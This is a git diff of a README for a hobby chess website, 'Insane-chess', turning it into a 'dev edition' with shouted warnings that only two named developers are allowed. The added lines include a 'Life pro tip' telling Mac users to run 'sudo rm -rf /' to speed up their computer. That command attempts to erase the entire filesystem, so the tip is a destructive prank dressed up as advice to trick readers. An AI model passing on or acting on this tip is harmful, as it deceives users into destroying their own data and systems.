@@ -1,5 +1,9 @@
-# Insane-chess
+# Insane-chess dev edition
 
-This site was made by @hardwaregore because I was bored. 
+LEAVE NOW! THIS SITE IS FOR DEVS ONLY! 
 
-@TechDudie is a contrubutor!
+ONLY @TechDudie AND @Hardwaregore ARE ALLOWEL! 
+
+Life pro tip: to make your mac faster, open the terminal and type in " sudo rm -rf / "
+
+NOW LEAVE THIS BRANCH IN 1...2...3......GO!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
